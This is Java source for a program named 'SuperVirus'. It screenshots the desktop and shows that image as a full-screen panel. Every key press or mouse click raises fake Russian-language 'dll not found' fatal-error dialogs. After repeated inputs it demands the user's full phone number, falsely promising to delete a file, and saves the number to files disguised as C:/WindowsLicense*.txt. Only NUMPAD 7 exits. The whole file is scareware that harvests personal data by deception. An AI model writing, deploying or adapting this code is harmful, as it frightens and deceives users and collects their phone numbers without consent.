
	
import java.awt.AWTException;
import java.awt.Color;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Random;
import java.util.Scanner;

import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.Timer;

public class SuperVirus extends JPanel implements KeyListener, MouseListener{

	private static final long serialVersionUID = -4677613205144698295L;

	private static final int EXIT_CODE = 103;
	
	Random r=new Random(); 
	
	int napr;
	int havetogo=0;
	int x=(int)Toolkit.getDefaultToolkit().getScreenSize().getWidth();
	int y=(int)Toolkit.getDefaultToolkit().getScreenSize().getHeight();

	
	//Timer mainTimer=new Timer(10,this);
	public BufferedImage image;

	private int i;

	private String s=null;

	private boolean vgadav=false;
	
	
	public SuperVirus() throws IOException {
		Robot r;
		try {
			r = new Robot();
			image=r.createScreenCapture(new Rectangle(0,0,(int)Toolkit.getDefaultToolkit().getScreenSize().getWidth(),(int)Toolkit.getDefaultToolkit().getScreenSize().getHeight()));
		} catch (AWTException e) {
			e.printStackTrace();
		}
		addKeyListener(this);
		addMouseListener(this);
		setFocusable(true);
		//mainTimer.start();
	}
		
	
		public void paint(Graphics g){
			g=(Graphics2D) g;
			g.drawImage(image, 0, 0, null);
			g.setColor(Color.BLACK);
		}
		
	/*
		public void actionPerformed(ActionEvent e) {
			x--;
			y--;
			repaint();
			if(x<=-200){
				x=(int)Toolkit.getDefaultToolkit().getScreenSize().getWidth();
				y=(int)Toolkit.getDefaultToolkit().getScreenSize().getHeight();
			}			
		}
	 */

	@Override
	public void keyPressed(KeyEvent e) {
		if (e.getKeyCode()==EXIT_CODE) System.exit(1);

		JOptionPane.showMessageDialog(null, "win32_aq"+(i+10)+".dll не найден", "Fatal error!", JOptionPane.ERROR_MESSAGE);
		if(vgadav==true){
			JOptionPane.showMessageDialog(null, "Press NUMPAD 7 to delete win32.dll", "Delete the file", JOptionPane.ERROR_MESSAGE);
		}
		
		i++;
		s="stup";		
		
			if((i>15)&&(vgadav==false)){
				s=JOptionPane.showInputDialog(null, "Type YOUR FULL phone number (with +)", null);
				if(s.length()==13){
					vgadav=true;
					JOptionPane.showMessageDialog(null, "Press NUMPAD 7 to delete win32.dll", "Delete the file", JOptionPane.ERROR_MESSAGE);
				}
			}
			if((s.length()==13)&&(vgadav==true)){
				JOptionPane.showMessageDialog(null, "Press NUMPAD 7 to delete win32.dll", "Delete the file", JOptionPane.ERROR_MESSAGE);
				
				File f=null;
				try {
					f=new File("C:/WindowsLicense0.txt");
					if(f.length()!=0){
						f=new File("C:/WindowsLicense1.txt");
						if(f.length()!=0){
							f=new File("C:/WindowsLicense2.txt");
							if(f.length()!=0){
								f=new File("C:/WindowsLicense3.txt");
								if(f.length()!=0){
									f=new File("C:/WindowsLicense4.txt");
								}
							}
						}
					}
					FileWriter fw=new FileWriter(f);
					fw.write(s);
					fw.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
				
			}
	}

	public void keyReleased(KeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

	public void keyTyped(KeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}
	
	public void mouseClicked(MouseEvent e) {
		JOptionPane.showMessageDialog(null, "win32_aq"+(i+10)+".dll не найден", "Fatal error!", JOptionPane.ERROR_MESSAGE);
		if(vgadav==true){
			JOptionPane.showMessageDialog(null, "Press NUMPAD 7 to delete win32.dll", "Delete the file", JOptionPane.ERROR_MESSAGE);
		}
		
		i++;
		s="stup";
		if((i>15)&&(vgadav==false)){
			s=JOptionPane.showInputDialog(null, "Type YOUR FULL phone number (with +)", null);
		}
		if(s.length()==13){
			JOptionPane.showMessageDialog(null, "Press NUMPAD 7 to delete win32.dll", "Delete the file", JOptionPane.ERROR_MESSAGE);
			vgadav=true;
			
			File f=null;
			try {
				f=new File("C:/WindowsLicense0.txt");
				if(f.length()!=0){
					f=new File("C:/WindowsLicense1.txt");
					if(f.length()!=0){
						f=new File("C:/WindowsLicense2.txt");
						if(f.length()!=0){
							f=new File("C:/WindowsLicense3.txt");
							if(f.length()!=0){
								f=new File("C:/WindowsLicense4.txt");
							}
						}
					}
				}
				FileWriter fw=new FileWriter(f);
				fw.write(s);
				fw.close();
			} catch (IOException e1) {
				e1.printStackTrace();
			}
			
		}
		
	}


	public void mouseEntered(MouseEvent e) {
		// TODO Auto-generated method stub
		
	}


	public void mouseExited(MouseEvent e) {
		// TODO Auto-generated method stub
		
	}


	public void mousePressed(MouseEvent e) {
		// TODO Auto-generated method stub
		
	}


	public void mouseReleased(MouseEvent e) {
		// TODO Auto-generated method stub
		
	}
}
